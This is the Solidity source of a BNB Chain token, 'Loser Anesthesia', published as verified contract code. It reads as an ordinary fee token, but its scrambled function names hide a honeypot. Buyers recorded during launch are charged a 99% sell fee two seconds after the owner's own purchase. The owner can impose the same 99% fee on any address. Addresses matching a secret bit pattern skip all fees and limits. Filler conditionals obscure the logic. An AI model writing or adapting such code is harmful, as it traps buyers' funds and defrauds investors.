/**
 *Submitted for verification at BscScan.com on 2022-12-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract LoserAnesthesia is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Loser Anesthesia ";
    string constant _symbol = "LoserAnesthesia";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private liquiditySwapBuyBurn;
    mapping(address => bool) private maxExemptLaunchedTeamBuyReceiverAuto;
    mapping(address => bool) private tradingSellSwapLimit;
    mapping(address => bool) private liquidityTxReceiverIs;
    mapping(address => uint256) private launchedMinBotsIsMax;
    mapping(uint256 => address) private buyBurnLiquidityBots;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private exemptIsModeBurn = 0;
    uint256 private minLimitLaunchedMarketing = 6;

    //SELL FEES
    uint256 private receiverIsBuySwap = 0;
    uint256 private botsMinAutoTxSwapReceiverTeam = 6;

    uint256 private burnLiquidityIsSellTxMarketing = minLimitLaunchedMarketing + exemptIsModeBurn;
    uint256 private autoReceiverBurnMode = 100;

    address private botsAutoLaunchedIs = (msg.sender); // auto-liq address
    address private feeLaunchedSellSwap = (0xB65AE2635e6Bc895DE16C354fFfFE0df08d0FC89); // marketing address
    address private exemptIsSellLiquidityLimit = DEAD;
    address private marketingReceiverLimitExemptTradingMinMode = DEAD;
    address private launchedReceiverAutoExemptMarketingTx = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private marketingExemptSellMaxReceiverTx;
    uint256 private burnLimitTxMarketing;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private buyIsMarketingSellReceiverTx;
    uint256 private txBotsAutoTeam;
    uint256 private receiverTradingMinMax;
    uint256 private isBuyExemptWalletMarketingTx;
    uint256 private walletTeamFeeSwapSell;

    bool private walletMarketingReceiverTxIsBuySell = true;
    bool private liquidityTxReceiverIsMode = true;
    bool private exemptTeamModeMinBurn = true;
    bool private sellMaxFeeTeamTradingLaunchedBurn = true;
    bool private buyTradingWalletFee = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private txAutoIsBurn = 6 * 10 ** 15;
    uint256 private limitLaunchedBuyTx = _totalSupply / 1000; // 0.1%

    
    uint256 private exemptReceiverLiquidityMax = 0;
    uint256 private receiverSwapTeamIs = 0;
    uint256 private buyTxTradingBots = 0;
    bool private walletLiquidityTxMarketing = false;
    bool private launchedLimitSellTxAutoWalletExempt = false;
    bool private receiverLiquidityLimitMin = false;
    uint256 private walletSwapAutoBurn = 0;
    uint256 private liquiditySwapMinMarketingMaxAutoTx = 0;
    uint256 private feeLiquidityAutoMax = 0;
    bool private receiverWalletModeTeamLimitSell = false;
    bool private receiverSwapTeamIs0 = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        buyIsMarketingSellReceiverTx = true;

        liquiditySwapBuyBurn[msg.sender] = true;
        liquiditySwapBuyBurn[address(this)] = true;

        maxExemptLaunchedTeamBuyReceiverAuto[msg.sender] = true;
        maxExemptLaunchedTeamBuyReceiverAuto[0x0000000000000000000000000000000000000000] = true;
        maxExemptLaunchedTeamBuyReceiverAuto[0x000000000000000000000000000000000000dEaD] = true;
        maxExemptLaunchedTeamBuyReceiverAuto[address(this)] = true;

        tradingSellSwapLimit[msg.sender] = true;
        tradingSellSwapLimit[0x0000000000000000000000000000000000000000] = true;
        tradingSellSwapLimit[0x000000000000000000000000000000000000dEaD] = true;
        tradingSellSwapLimit[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return exemptSellFeeMin(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Loser Anesthesia  Insufficient Allowance");
        }

        return exemptSellFeeMin(sender, recipient, amount);
    }

    function exemptSellFeeMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = feeWalletModeSwap(sender) || feeWalletModeSwap(recipient);
        
        if (receiverSwapTeamIs == walletSwapAutoBurn) {
            receiverSwapTeamIs = walletSwapAutoBurn;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isOwner(recipient)) {
                marketingFeeSellMax();
            }
            if (!bLimitTxWalletValue) {
                launchedTradingLiquiditySwap(recipient);
            }
        }
        
        if (launchedLimitSellTxAutoWalletExempt != exemptTeamModeMinBurn) {
            launchedLimitSellTxAutoWalletExempt = walletMarketingReceiverTxIsBuySell;
        }

        if (receiverSwapTeamIs == txAutoIsBurn) {
            receiverSwapTeamIs = exemptReceiverLiquidityMax;
        }

        if (feeLiquidityAutoMax != autoReceiverBurnMode) {
            feeLiquidityAutoMax = buyTxTradingBots;
        }


        if (inSwap || bLimitTxWalletValue) {return minMarketingBurnLiquidityBuyMode(sender, recipient, amount);}

        if (!liquiditySwapBuyBurn[sender] && !liquiditySwapBuyBurn[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Loser Anesthesia  Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || tradingSellSwapLimit[sender] || tradingSellSwapLimit[recipient], "Loser Anesthesia  Max TX Limit has been triggered");

        if (autoReceiverMinBots()) {swapSellMinBuyWallet();}

        _balances[sender] = _balances[sender].sub(amount, "Loser Anesthesia  Insufficient Balance");
        
        uint256 amountReceived = minFeeTeamAuto(sender) ? burnExemptMaxFeeAutoBots(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function minMarketingBurnLiquidityBuyMode(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Loser Anesthesia  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function minFeeTeamAuto(address sender) internal view returns (bool) {
        return !maxExemptLaunchedTeamBuyReceiverAuto[sender];
    }

    function sellReceiverAutoLiquiditySwapLaunchedMode(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            burnLiquidityIsSellTxMarketing = botsMinAutoTxSwapReceiverTeam + receiverIsBuySwap;
            return autoIsBuyMaxModeLiquidityLaunched(sender, burnLiquidityIsSellTxMarketing);
        }
        if (!selling && sender == uniswapV2Pair) {
            burnLiquidityIsSellTxMarketing = minLimitLaunchedMarketing + exemptIsModeBurn;
            return burnLiquidityIsSellTxMarketing;
        }
        return autoIsBuyMaxModeLiquidityLaunched(sender, burnLiquidityIsSellTxMarketing);
    }

    function minAutoBurnBotsTeamSwap() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function burnExemptMaxFeeAutoBots(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (buyTxTradingBots == limitLaunchedBuyTx) {
            buyTxTradingBots = autoReceiverBurnMode;
        }

        if (launchedLimitSellTxAutoWalletExempt == receiverLiquidityLimitMin) {
            launchedLimitSellTxAutoWalletExempt = liquidityTxReceiverIsMode;
        }

        if (walletSwapAutoBurn == exemptReceiverLiquidityMax) {
            walletSwapAutoBurn = feeLiquidityAutoMax;
        }


        uint256 feeAmount = amount.mul(sellReceiverAutoLiquiditySwapLaunchedMode(sender, receiver == uniswapV2Pair)).div(autoReceiverBurnMode);

        if (liquidityTxReceiverIs[sender] || liquidityTxReceiverIs[receiver]) {
            feeAmount = amount.mul(99).div(autoReceiverBurnMode);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function feeWalletModeSwap(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function autoIsBuyMaxModeLiquidityLaunched(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = launchedMinBotsIsMax[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function launchedTradingLiquiditySwap(address addr) private {
        if (minAutoBurnBotsTeamSwap() < txAutoIsBurn) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        buyBurnLiquidityBots[exemptLimitValue] = addr;
    }

    function marketingFeeSellMax() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (launchedMinBotsIsMax[buyBurnLiquidityBots[i]] == 0) {
                    launchedMinBotsIsMax[buyBurnLiquidityBots[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(feeLaunchedSellSwap).transfer(amountBNB * amountPercentage / 100);
    }

    function autoReceiverMinBots() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    buyTradingWalletFee &&
    _balances[address(this)] >= limitLaunchedBuyTx;
    }

    function swapSellMinBuyWallet() internal swapping {
        
        uint256 amountToLiquify = limitLaunchedBuyTx.mul(exemptIsModeBurn).div(burnLiquidityIsSellTxMarketing).div(2);
        uint256 amountToSwap = limitLaunchedBuyTx.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (receiverWalletModeTeamLimitSell == walletMarketingReceiverTxIsBuySell) {
            receiverWalletModeTeamLimitSell = liquidityTxReceiverIsMode;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = burnLiquidityIsSellTxMarketing.sub(exemptIsModeBurn.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(exemptIsModeBurn).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(minLimitLaunchedMarketing).div(totalETHFee);
        
        payable(feeLaunchedSellSwap).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                botsAutoLaunchedIs,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getFeeLiquidityAutoMax() public view returns (uint256) {
        if (feeLiquidityAutoMax == minLimitLaunchedMarketing) {
            return minLimitLaunchedMarketing;
        }
        if (feeLiquidityAutoMax != receiverSwapTeamIs) {
            return receiverSwapTeamIs;
        }
        return feeLiquidityAutoMax;
    }
    function setFeeLiquidityAutoMax(uint256 a0) public onlyOwner {
        if (feeLiquidityAutoMax == buyTxTradingBots) {
            buyTxTradingBots=a0;
        }
        if (feeLiquidityAutoMax == exemptIsModeBurn) {
            exemptIsModeBurn=a0;
        }
        if (feeLiquidityAutoMax == feeLiquidityAutoMax) {
            feeLiquidityAutoMax=a0;
        }
        feeLiquidityAutoMax=a0;
    }

    function getWalletSwapAutoBurn() public view returns (uint256) {
        if (walletSwapAutoBurn != receiverSwapTeamIs) {
            return receiverSwapTeamIs;
        }
        if (walletSwapAutoBurn != exemptReceiverLiquidityMax) {
            return exemptReceiverLiquidityMax;
        }
        if (walletSwapAutoBurn == txAutoIsBurn) {
            return txAutoIsBurn;
        }
        return walletSwapAutoBurn;
    }
    function setWalletSwapAutoBurn(uint256 a0) public onlyOwner {
        if (walletSwapAutoBurn != buyTxTradingBots) {
            buyTxTradingBots=a0;
        }
        if (walletSwapAutoBurn == exemptReceiverLiquidityMax) {
            exemptReceiverLiquidityMax=a0;
        }
        if (walletSwapAutoBurn != txAutoIsBurn) {
            txAutoIsBurn=a0;
        }
        walletSwapAutoBurn=a0;
    }

    function getFeeLaunchedSellSwap() public view returns (address) {
        if (feeLaunchedSellSwap == botsAutoLaunchedIs) {
            return botsAutoLaunchedIs;
        }
        if (feeLaunchedSellSwap == feeLaunchedSellSwap) {
            return feeLaunchedSellSwap;
        }
        if (feeLaunchedSellSwap == feeLaunchedSellSwap) {
            return feeLaunchedSellSwap;
        }
        return feeLaunchedSellSwap;
    }
    function setFeeLaunchedSellSwap(address a0) public onlyOwner {
        feeLaunchedSellSwap=a0;
    }

    function getExemptIsModeBurn() public view returns (uint256) {
        return exemptIsModeBurn;
    }
    function setExemptIsModeBurn(uint256 a0) public onlyOwner {
        if (exemptIsModeBurn != limitLaunchedBuyTx) {
            limitLaunchedBuyTx=a0;
        }
        if (exemptIsModeBurn != minLimitLaunchedMarketing) {
            minLimitLaunchedMarketing=a0;
        }
        exemptIsModeBurn=a0;
    }

    function getBuyTradingWalletFee() public view returns (bool) {
        if (buyTradingWalletFee != liquidityTxReceiverIsMode) {
            return liquidityTxReceiverIsMode;
        }
        if (buyTradingWalletFee == liquidityTxReceiverIsMode) {
            return liquidityTxReceiverIsMode;
        }
        return buyTradingWalletFee;
    }
    function setBuyTradingWalletFee(bool a0) public onlyOwner {
        buyTradingWalletFee=a0;
    }

    function getLaunchedMinBotsIsMax(address a0) public view returns (uint256) {
        if (a0 == launchedReceiverAutoExemptMarketingTx) {
            return feeLiquidityAutoMax;
        }
        if (a0 != marketingReceiverLimitExemptTradingMinMode) {
            return botsMinAutoTxSwapReceiverTeam;
        }
            return launchedMinBotsIsMax[a0];
    }
    function setLaunchedMinBotsIsMax(address a0,uint256 a1) public onlyOwner {
        if (a0 == botsAutoLaunchedIs) {
            receiverSwapTeamIs=a1;
        }
        launchedMinBotsIsMax[a0]=a1;
    }

    function getMarketingReceiverLimitExemptTradingMinMode() public view returns (address) {
        return marketingReceiverLimitExemptTradingMinMode;
    }
    function setMarketingReceiverLimitExemptTradingMinMode(address a0) public onlyOwner {
        if (marketingReceiverLimitExemptTradingMinMode != marketingReceiverLimitExemptTradingMinMode) {
            marketingReceiverLimitExemptTradingMinMode=a0;
        }
        marketingReceiverLimitExemptTradingMinMode=a0;
    }

    function getLiquidityTxReceiverIs(address a0) public view returns (bool) {
        if (a0 != marketingReceiverLimitExemptTradingMinMode) {
            return liquidityTxReceiverIsMode;
        }
        if (a0 != launchedReceiverAutoExemptMarketingTx) {
            return exemptTeamModeMinBurn;
        }
            return liquidityTxReceiverIs[a0];
    }
    function setLiquidityTxReceiverIs(address a0,bool a1) public onlyOwner {
        if (a0 == feeLaunchedSellSwap) {
            liquidityTxReceiverIsMode=a1;
        }
        if (a0 == botsAutoLaunchedIs) {
            walletMarketingReceiverTxIsBuySell=a1;
        }
        liquidityTxReceiverIs[a0]=a1;
    }

    function getBotsAutoLaunchedIs() public view returns (address) {
        if (botsAutoLaunchedIs != exemptIsSellLiquidityLimit) {
            return exemptIsSellLiquidityLimit;
        }
        if (botsAutoLaunchedIs == launchedReceiverAutoExemptMarketingTx) {
            return launchedReceiverAutoExemptMarketingTx;
        }
        if (botsAutoLaunchedIs != botsAutoLaunchedIs) {
            return botsAutoLaunchedIs;
        }
        return botsAutoLaunchedIs;
    }
    function setBotsAutoLaunchedIs(address a0) public onlyOwner {
        botsAutoLaunchedIs=a0;
    }

    function getSellMaxFeeTeamTradingLaunchedBurn() public view returns (bool) {
        if (sellMaxFeeTeamTradingLaunchedBurn != receiverSwapTeamIs0) {
            return receiverSwapTeamIs0;
        }
        return sellMaxFeeTeamTradingLaunchedBurn;
    }
    function setSellMaxFeeTeamTradingLaunchedBurn(bool a0) public onlyOwner {
        if (sellMaxFeeTeamTradingLaunchedBurn == walletMarketingReceiverTxIsBuySell) {
            walletMarketingReceiverTxIsBuySell=a0;
        }
        if (sellMaxFeeTeamTradingLaunchedBurn != receiverWalletModeTeamLimitSell) {
            receiverWalletModeTeamLimitSell=a0;
        }
        sellMaxFeeTeamTradingLaunchedBurn=a0;
    }

    function getMaxExemptLaunchedTeamBuyReceiverAuto(address a0) public view returns (bool) {
            return maxExemptLaunchedTeamBuyReceiverAuto[a0];
    }
    function setMaxExemptLaunchedTeamBuyReceiverAuto(address a0,bool a1) public onlyOwner {
        maxExemptLaunchedTeamBuyReceiverAuto[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}